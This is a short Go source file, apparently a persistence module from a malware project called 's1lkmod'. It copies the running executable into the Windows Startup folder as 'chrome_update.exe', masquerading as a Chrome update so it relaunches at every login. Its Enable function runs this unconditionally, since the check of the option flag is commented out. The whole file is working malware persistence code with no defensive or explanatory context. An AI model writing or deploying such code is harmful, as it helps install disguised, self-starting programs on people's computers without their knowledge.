package persistence

import (
	"fmt"
	"os"
	"s1lkmod/pkg/modules/file"
)

func startupSetup() {
	appData := os.Getenv("APPDATA")
	sourceFile := os.Args[0]
	path := fmt.Sprintf("%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome_update.exe", appData)
	fileExist := file.CheckFileExistence(path)
	if !fileExist {
		_, err := file.CopyFile(sourceFile, path)
		if err != nil {
			panic(err)
		}
	}

}

func Enable(option bool) {
	// if option {
	// 	startupSetup()
	// }
	startupSetup()
}
